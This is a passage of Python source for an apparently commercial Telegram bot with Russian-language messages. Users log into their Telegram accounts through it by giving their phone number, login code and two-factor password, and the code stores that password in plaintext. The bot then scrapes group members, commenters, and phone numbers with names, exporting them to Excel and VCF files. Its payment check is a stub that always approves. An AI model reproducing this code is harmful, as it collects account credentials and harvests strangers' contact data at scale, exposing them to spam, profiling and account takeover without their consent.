    subscription_type = f'Платная ({sub_type})' if sub_type in ['1h', '3d', '7d'] else 'Платная (бессрочная)'
    update_user_data(target_user_id, "Имя пользователя", context, subscription={'type': subscription_type, 'end': end_time.isoformat() if end_time else None})
    
    username = load_users().get(str(target_user_id), {}).get('name', 'Неизвестно')
    lang = load_users().get(str(target_user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    notification = texts['payment_success'].format(end_time=end_time.strftime('%Y-%m-%d %H:%M:%S') if end_time else 'бессрочно')
    await context.bot.send_message(chat_id=target_user_id, text=f"🎉 {notification}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['payment_update'], callback_data='update_menu')]]))
    
    await update.message.reply_text(f"Подписка для пользователя {target_user_id} ({username}) обновлена до {end_time.strftime('%Y-%m-%d %H:%M:%S') if end_time else 'бессрочно'}.")
    await log_to_channel(context, f"Администратор установил подписку для пользователя {target_user_id} ({username}): {sub_type}, до {end_time if end_time else 'бессрочно'}", "Администратор")

# Обработчик команды /remove_plan
async def remove_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) not in ADMIN_IDS:
        await update.message.reply_text("У вас нет прав для этой команды.")
        return
    
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Использование: /remove_plan <user_id>")
        return
    
    target_user_id = args[0]
    if str(target_user_id) not in load_users():
        await update.message.reply_text("Пользователь не найден.")
        return
    
    update_user_data(target_user_id, "Имя пользователя", context, subscription={'type': 'Бесплатная', 'end': None})
    username = load_users().get(str(target_user_id), {}).get('name', 'Неизвестно')
    await update.message.reply_text(f"Платная подписка для пользователя {target_user_id} ({username}) удалена, установлен бесплатный план.")
    await log_to_channel(context, f"Администратор удалил платную подписку для пользователя {target_user_id} ({username})", "Администратор")

# Обработчик команды /note
async def note(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    name = update.effective_user.full_name or "Без имени"
    if not context.args:
        await update.message.reply_text("Использование: /note <текст>")
        return
    note_text = " ".join(context.args)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    await log_to_channel(context, f"Заметка от {name} (@{username}): {note_text}", username)
    await update.message.reply_text(LANGUAGES[lang]['note_cmd'])

# Обработчик текстовых сообщений
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    name = update.effective_user.full_name or "Без имени"
    users = load_users()
    user_id_str = str(user_id)
    lang = users.get(user_id_str, {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    message_text = update.message.text.strip()

    # Проверка авторизации
    if context.user_data.get('waiting_for_phone'):
        phone_number = message_text
        client = get_telethon_client(user_id)
        context.user_data['client'] = client
        try:
            await client.connect()
            sent_code = await client.send_code_request(phone_number)
            context.user_data['phone_code_hash'] = sent_code.phone_code_hash
            context.user_data['phone_number'] = phone_number
            context.user_data['waiting_for_phone'] = False
            context.user_data['waiting_for_code'] = True
            await update.message.reply_text(texts['enter_code'])
            await log_to_channel(context, f"Код отправлен на {phone_number} для {name} (@{username})", username)
        except telethon_errors.RPCError as e:
            await update.message.reply_text(texts['auth_error'].format(error=str(e)))
            await log_to_channel(context, f"Ошибка отправки кода для {name} (@{username}): {str(e)}", username)
        finally:
            await client.disconnect()
        return

    if context.user_data.get('waiting_for_code'):
        code = message_text
        client = context.user_data.get('client')
        phone_number = context.user_data.get('phone_number')
        phone_code_hash = context.user_data.get('phone_code_hash')
        try:
            await client.connect()
            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
            context.user_data['waiting_for_code'] = False
            await update.message.reply_text(texts['auth_success'])
            await save_session_data(user_id, {'phone_number': phone_number})
            await log_to_channel(context, f"Успешная авторизация для {name} (@{username})", username)
            await update.message.reply_text(texts['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['subscribed'], callback_data='subscribed')]]))
            update_user_data(user_id, name, context)
        except telethon_errors.SessionPasswordNeededError:
            context.user_data['waiting_for_code'] = False
            context.user_data['waiting_for_password'] = True
            await update.message.reply_text(texts['enter_password'])
        except telethon_errors.RPCError as e:
            await update.message.reply_text(texts['auth_error'].format(error=str(e)))
            await log_to_channel(context, f"Ошибка авторизации для {name} (@{username}): {str(e)}", username)
        finally:
            await client.disconnect()
        return

    if context.user_data.get('waiting_for_password'):
        password = message_text
        client = context.user_data.get('client')
        phone_number = context.user_data.get('phone_number')
        try:
            await client.connect()
            await client.sign_in(password=password)
            context.user_data['waiting_for_password'] = False
            await update.message.reply_text(texts['auth_success'])
            await save_session_data(user_id, {'phone_number': phone_number, 'password': password})
            await log_to_channel(context, f"Успешная авторизация с паролем для {name} (@{username})", username)
            await update.message.reply_text(texts['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['subscribed'], callback_data='subscribed')]]))
            update_user_data(user_id, name, context)
        except telethon_errors.RPCError as e:
            await update.message.reply_text(texts['auth_error'].format(error=str(e)))
            await log_to_channel(context, f"Ошибка ввода пароля для {name} (@{username}): {str(e)}", username)
        finally:
            await client.disconnect()
        return

    # Проверка лимита запросов
    limit_ok, hours_left = check_request_limit(user_id)
    if not limit_ok:
        await update.message.reply_text(texts['limit_reached'].format(limit=5 if users[user_id_str]['subscription']['type'] == 'Бесплатная' else 10, hours=hours_left))
        return

    # Обработка ссылок для парсинга групп
    if context.user_data.get('waiting_for_group_link'):
        links = message_text.split('\n')
        valid_links = []
        for link in links:
            link = link.strip()
            if link.startswith('https://t.me/') or link.startswith('@') or link.startswith('t.me/'):
                valid_links.append(link.replace('https://', '').replace('t.me/', '').replace('@', ''))
            else:
                await update.message.reply_text(texts['invalid_link'])
                await update.message.reply_text(texts['retry_link'])
                return
        context.user_data['group_links'] = valid_links
        context.user_data['waiting_for_group_link'] = False
        keyboard = [
            [InlineKeyboardButton("150", callback_data='limit_150'), InlineKeyboardButton("500", callback_data='limit_500')],
            [InlineKeyboardButton("1000", callback_data='limit_1000'), InlineKeyboardButton("5000", callback_data='limit_5000')],
            [InlineKeyboardButton(texts['skip'], callback_data='limit_custom')]
        ]
        await update.message.reply_text(texts['limit'], reply_markup=InlineKeyboardMarkup(keyboard))
        return

    # Обработка пользовательского лимита
    if context.user_data.get('waiting_for_custom_limit'):
        try:
            limit = int(message_text)
            max_limit = check_parse_limit(user_id, limit, context.user_data.get('parse_type', 'parse_participants'))
            if limit <= 0 or limit > max_limit:
                await update.message.reply_text(texts['invalid_limit'].format(max_limit=max_limit))
                return
            context.user_data['limit'] = limit
            context.user_data['waiting_for_custom_limit'] = False
            await ask_filters(update, context)
        except ValueError:
            await update.message.reply_text(texts['invalid_number'])
        return

    # Обработка ссылок на посты
    if context.user_data.get('waiting_for_post_link'):
        links = message_text.split('\n')
        valid_links = []
        for link in links:
            link = link.strip()
            if link.startswith('https://t.me/') and '/' in link.split('https://t.me/')[1]:
                valid_links.append(link)
            else:
                await update.message.reply_text(texts['invalid_link'])
                await update.message.reply_text(texts['retry_link'])
                return
        context.user_data['post_links'] = valid_links
        context.user_data['waiting_for_post_link'] = False
        keyboard = [
            [InlineKeyboardButton("150", callback_data='limit_150'), InlineKeyboardButton("500", callback_data='limit_500')],
            [InlineKeyboardButton("1000", callback_data='limit_1000'), InlineKeyboardButton("5000", callback_data='limit_5000')],
            [InlineKeyboardButton(texts['skip'], callback_data='limit_custom')]
        ]
        await update.message.reply_text(texts['limit'], reply_markup=InlineKeyboardMarkup(keyboard))
        return

    # Обработка идентификаторов
    if context.user_data.get('waiting_for_identifier'):
        identifier = message_text.strip()
        client = get_telethon_client(user_id)
        try:
            await client.connect()
            if identifier.startswith('@'):
                entity = await client.get_entity(identifier)
                entity_id = entity.id
            elif identifier.startswith('https://t.me/'):
                entity = await client.get_entity(identifier.split('/')[-2])
                entity_id = entity.id
            elif update.message.forward_from or update.message.forward_from_chat:
                entity_id = update.message.forward_from.id if update.message.forward_from else update.message.forward_from_chat.id
            else:
                entity = await client.get_entity(int(identifier))
                entity_id = entity.id
            await update.message.reply_text(texts['id_result'].format(id=entity_id), reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(texts['continue_id'], callback_data='continue_id'), InlineKeyboardButton(texts['close'], callback_data='close')]
            ]))
            update_user_data(user_id, name, context, requests=1)
            await log_to_channel(context, f"ID найден: {entity_id} для {name} (@{username})", username)
        except ValueError:
            await update.message.reply_text(texts['entity_error'])
        except telethon_errors.RPCError as e:
            await update.message.reply_text(texts['rpc_error'].format(e=str(e)))
        finally:
            await client.disconnect()
        return

    # Обработка хеша транзакции
    if context.user_data.get('waiting_for_tx_hash'):
        tx_hash = message_text.strip()
        amount = context.user_data.get('payment_amount')
        sub_type = context.user_data.get('subscription_type')
        await update.message.reply_text(texts['payment_pending'])
        # Здесь должна быть логика проверки транзакции через TON API
        # Пример заглушки:
        if verify_transaction(tx_hash, amount):
            now = datetime.now()
            if sub_type == '1h':
                end_time = now + timedelta(hours=1)
            elif sub_type == '3d':
                end_time = now + timedelta(days=3)
            elif sub_type == '7d':
                end_time = now + timedelta(days=7)
            update_user_data(user_id, name, context, subscription={'type': f'Платная ({sub_type})', 'end': end_time.isoformat()})
            await update.message.reply_text(texts['payment_success'].format(end_time=end_time.strftime('%Y-%m-%d %H:%M:%S')))
            await log_to_channel(context, f"Подписка {sub_type} успешно оформлена для {name} (@{username})", username)
        else:
            await update.message.reply_text(texts['payment_error'])
            await log_to_channel(context, f"Ошибка оплаты для {name} (@{username})", username)
        context.user_data['waiting_for_tx_hash'] = False
        return

    # Заметка для администратора
    if message_text.startswith('/note'):
        if user_id_str in ADMIN_IDS:
            await update.message.reply_text(texts['note_cmd'])
            await log_to_channel(context, f"Заметка от {name} (@{username}): {message_text[6:]}", username)
        return

# Вопросы о фильтрах
async def ask_filters(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users = load_users()
    lang = users.get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    keyboard = [
        [InlineKeyboardButton("Да", callback_data='filter_username_yes'), InlineKeyboardButton("Нет", callback_data='filter_username_no')]
    ]
    await update.effective_message.reply_text(texts['filter_username'], reply_markup=InlineKeyboardMarkup(keyboard))

# Проверка транзакции (заглушка)
def verify_transaction(tx_hash, amount):
    # Здесь должна быть реальная проверка через TON API
    # Пример заглушки:
    return True

# Обработчик кнопок
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    username = query.from_user.username
    name = query.from_user.full_name or "Без имени"
    users = load_users()
    user_id_str = str(user_id)
    lang = users.get(user_id_str, {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    data = query.data

    await query.answer()

    # Выбор языка
    if data.startswith('lang_'):
        lang = data.split('_')[1]
        update_user_data(user_id, name, context, lang=lang)
        await query.edit_message_text(texts['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['subscribed'], callback_data='subscribed')]]))
        await log_to_channel(context, f"Язык изменён на {lang} для {name} (@{username})", username)
        return

    # Проверка подписки
    if data == 'subscribed':
        try:
            member = await context.bot.get_chat_member(SUBSCRIPTION_CHANNEL_ID, user_id)
            if member.status in ['member', 'administrator', 'creator']:
                message, reply_markup = get_main_menu(user_id, context)
                await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
            else:
                await query.edit_message_text(texts['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['subscribed'], callback_data='subscribed')]]))
        except telegram_error.BadRequest:
            await query.edit_message_text(texts['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['subscribed'], callback_data='subscribed')]]))
        return

    # Главное меню
    if data == 'main_menu':
        message, reply_markup = get_main_menu(user_id, context)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
        return

    # Идентификаторы
    if data == 'identifiers':
        await query.edit_message_text(texts['identifiers'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='main_menu')]]))
        context.user_data['waiting_for_identifier'] = True
        return

    if data == 'continue_id':
        await query.edit_message_text(texts['identifiers'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='main_menu')]]))
        context.user_data['waiting_for_identifier'] = True
        return

    # Парсер
    if data == 'parser':
        keyboard = [
            [InlineKeyboardButton("Участники группы" if lang == 'Русский' else "Учасники групи" if lang == 'Украинский' else "Group participants" if lang == 'English' else "Gruppenteilnehmer", callback_data='parse_participants')],
            [InlineKeyboardButton("Авторы комментариев" if lang == 'Русский' else "Автори коментарів" if lang == 'Украинский' else "Comment authors" if lang == 'English' else "Kommentarautoren", callback_data='parse_authors')],
            [InlineKeyboardButton("Комментаторы поста" if lang == 'Русский' else "Коментатори поста" if lang == 'Украинский' else "Post commentators" if lang == 'English' else "Beitragskommentatoren", callback_data='parse_post_commentators')],
            [InlineKeyboardButton("Номера и ФИО" if lang == 'Русский' else "Номери та ПІБ" if lang == 'Украинский' else "Phone numbers and names" if lang == 'English' else "Telefonnummern und Namen", callback_data='parse_phones')],
            [InlineKeyboardButton(texts['close'], callback_data='main_menu')]
        ]
        await query.edit_message_text(texts['parser'], reply_markup=InlineKeyboardMarkup(keyboard))
        return

    # Парсинг участников группы
    if data == 'parse_participants':
        context.user_data['parse_type'] = 'parse_participants'
        await query.edit_message_text(texts['link_group'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='main_menu')]]))
        context.user_data['waiting_for_group_link'] = True
        return

    # Парсинг авторов комментариев
    if data == 'parse_authors':
        context.user_data['parse_type'] = 'parse_authors'
        await query.edit_message_text(texts['link_group'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='main_menu')]]))
        context.user_data['waiting_for_group_link'] = True
        return

    # Парсинг комментаторов поста
    if data == 'parse_post_commentators':
        context.user_data['parse_type'] = 'parse_post_commentators'
        await query.edit_message_text(texts['link_post'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='main_menu')]]))
        context.user_data['waiting_for_post_link'] = True
        return

    # Парсинг номеров и ФИО
    if data == 'parse_phones':
        context.user_data['parse_type'] = 'parse_phones'
        await query.edit_message_text(texts['link_group'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='main_menu')]]))
        context.user_data['waiting_for_group_link'] = True
        return

    # Выбор лимита
    if data.startswith('limit_'):
        if data == 'limit_custom':
            context.user_data['waiting_for_custom_limit'] = True
            await query.edit_message_text(texts['limit'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='main_menu')]]))
        else:
            limit = int(data.split('_')[1])
            context.user_data['limit'] = check_parse_limit(user_id, limit, context.user_data.get('parse_type'))
            await ask_filters(query, context)
        return

    # Фильтры
    if data.startswith('filter_username_'):
        context.user_data['filters'] = context.user_data.get('filters', {})
        context.user_data['filters']['only_with_username'] = data.endswith('yes')
        keyboard = [
            [InlineKeyboardButton("Да", callback_data='filter_bots_yes'), InlineKeyboardButton("Нет", callback_data='filter_bots_no')]
        ]
        await query.edit_message_text(texts['filter_bots'], reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith('filter_bots_'):
        context.user_data['filters']['exclude_bots'] = data.endswith('yes')
        keyboard = [
            [InlineKeyboardButton("Да", callback_data='filter_active_yes'), InlineKeyboardButton("Нет", callback_data='filter_active_no')]
        ]
        await query.edit_message_text(texts['filter_active'], reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith('filter_active_'):
        context.user_data['filters']['only_active'] = data.endswith('yes')
        await start_parsing(query, context)
        return

    # Подписка
    if data == 'subscribe':
        keyboard = [
            [InlineKeyboardButton(texts['subscription_1h'], callback_data='sub_1h')],
            [InlineKeyboardButton(texts['subscription_3d'], callback_data='sub_3d')],
            [InlineKeyboardButton(texts['subscription_7d'], callback_data='sub_7d')],
            [InlineKeyboardButton(texts['close'], callback_data='main_menu')]
        ]
        await query.edit_message_text("Выберите подписку:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith('sub_'):
        sub_type = data.split('_')[1]
        amount = {'1h': 2, '3d': 5, '7d': 7}[sub_type]
        context.user_data['subscription_type'] = sub_type
        context.user_data['payment_amount'] = amount
        keyboard = [
            [InlineKeyboardButton(texts['payment_paid'], callback_data='paid')],
            [InlineKeyboardButton(texts['payment_cancel'], callback_data='main_menu')]
        ]
        await query.edit_message_text(texts['payment_wallet'].format(amount=amount, address=TON_WALLET_ADDRESS), reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == 'paid':
        context.user_data['waiting_for_tx_hash'] = True
        await query.edit_message_text(texts['payment_hash'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['payment_cancel'], callback_data='main_menu')]]))
        return

    # Реквизиты
    if data == 'requisites':
        await query.edit_message_text(texts['requisites'].format(support=SUPPORT_USERNAME), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='main_menu')]]))
        return

    # Логи
    if data == 'logs_channel' and user_id_str in ADMIN_IDS:
        await query.edit_message_text(texts['logs_channel'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='main_menu')]]))
        return

    # Закрытие
    if data == 'close':
        message, reply_markup = get_main_menu(user_id, context)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
        return

# Старт парсинга
async def start_parsing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    name = update.effective_user.full_name or "Без имени"
    users = load_users()
    lang = users.get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    parse_type = context.user_data.get('parse_type')
    limit = context.user_data.get('limit')
    filters = context.user_data.get('filters', {})
    client = get_telethon_client(user_id)

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await update.effective_message.reply_text(texts['auth_error'].format(error="Не авторизован"))
            return

        data = []
        if parse_type == 'parse_participants':
            for link in context.user_data.get('group_links', []):
                try:
                    entity = await client.get_entity(link)
                    async for user in client.iter_participants(entity, limit=limit):
                        data.append([user.id, user.username or '', user.first_name or '', user.last_name or '', user.bot, user])
                except telethon_errors.ChatAdminRequiredError:
                    await update.effective_message.reply_text(texts['no_access'].format(link=link))
                    return
                except telethon_errors.RPCError as e:
                    await update.effective_message.reply_text(texts['rpc_error'].format(e=str(e)))
                    return

        elif parse_type == 'parse_authors':
            for link in context.user_data.get('group_links', []):
                try:
                    entity = await client.get_entity(link)
                    async for message in client.iter_messages(entity, limit=limit):
                        if message.from_id:
                            user = await client.get_entity(message.from_id)
                            data.append([user.id, user.username or '', user.first_name or '', user.last_name or '', user.bot, user])
                except telethon_errors.ChatAdminRequiredError:
                    await update.effective_message.reply_text(texts['no_access'].format(link=link))
                    return
                except telethon_errors.RPCError as e:
                    await update.effective_message.reply_text(texts['rpc_error'].format(e=str(e)))
                    return

        elif parse_type == 'parse_post_commentators':
            for link in context.user_data.get('post_links', []):
                try:
                    chat_name, post_id = link.split('/')[-2], int(link.split('/')[-1])
                    entity = await client.get_entity(chat_name)
                    async for comment in client.iter_messages(entity, reply_to=post_id, limit=limit):
                        if comment.from_id:
                            user = await client.get_entity(comment.from_id)
                            data.append([user.id, user.username or '', user.first_name or '', user.last_name or '', user.bot, user])
                except telethon_errors.RPCError as e:
                    await update.effective_message.reply_text(texts['rpc_error'].format(e=str(e)))
                    return

        elif parse_type == 'parse_phones':
            phone_data = []
            for link in context.user_data.get('group_links', []):
                try:
                    entity = await client.get_entity(link)
                    async for user in client.iter_participants(entity, limit=limit):
                        if user.phone:
                            phone_data.append({
                                'ID': user.id,
                                'Username': user.username or '',
                                'First Name': user.first_name or '',
                                'Last Name': user.last_name or '',
                                'Phone': user.phone,
                            })
                except telethon_errors.ChatAdminRequiredError:
                    await update.effective_message.reply_text(texts['no_access'].format(link=link))
                    return
                except telethon_errors.RPCError as e:
                    await update.effective_message.reply_text(texts['rpc_error'].format(e=str(e)))
                    return
            if phone_data:
                df = pd.DataFrame(phone_data)
                excel_file = await create_excel_in_memory(phone_data)
                vcf_file = create_vcf_file(df)
                await update.effective_message.reply_document(document=excel_file, filename='phones.xlsx', caption=texts['caption_phones'])
                await update.effective_message.reply_document(document=vcf_file, filename='phones.vcf')
                update_user_data(user_id, name, context, requests=1)
                await log_to_channel(context, f"Успешный парсинг номеров для {name} (@{username})", username)
            else:
                await update.effective_message.reply_text("Не удалось найти пользователей с номерами телефонов.")
            return

        filtered_data = filter_data(data, filters)
        if filtered_data:
            excel_file = await create_excel_in_memory(filtered_data)
            caption = (texts['caption_participants'] if parse_type == 'parse_participants' else 
                       texts['caption_commentators'] if parse_type == 'parse_authors' else 
                       texts['caption_post_commentators'])
            stats = get_statistics(filtered_data)
            await update.effective_message.reply_document(document=excel_file, filename='result.xlsx', caption=f"{caption}\n\n{stats}")
            update_user_data(user_id, name, context, requests=1)
            await log_to_channel(context, f"Успешный парсинг ({parse_type}) для {name} (@{username})", username)
        else:
            await update.effective_message.reply_text("Нет данных после фильтрации.")
    except telethon_errors.FloodWaitError as e:
        await update.effective_message.reply_text(texts['flood_error'].format(e=str(e)))
    except Exception as e:
        await update.effective_message.reply_text(texts['rpc_error'].format(e=str(e)))
        await log_to_channel(context, f"Ошибка парсинга для {name} (@{username}): {str(e)}", username)
    finally:
        await client.disconnect()
        context.user_data['filters'] = {}
        context.user_data['limit'] = None
        context.user_data['group_links'] = None
        context.user_data['post_links'] = None
        message, reply_markup = get_main_menu(user_id, context)
        await update.effective_message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

# Обработчик ошибок
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Ошибка: {context.error}")
    traceback.print_exc()
    if update and update.effective_message:
        await update.effective_message.reply_text("Произошла ошибка. Попробуйте позже или обратитесь в поддержку: " + SUPPORT_USERNAME)

# Запуск бота
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("language", language))
    application.add_handler(CommandHandler("set_plan", set_plan))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button))
    application.add_error_handler(error_handler)

    application.run_polling()

if __name__ == '__main__':
    main()
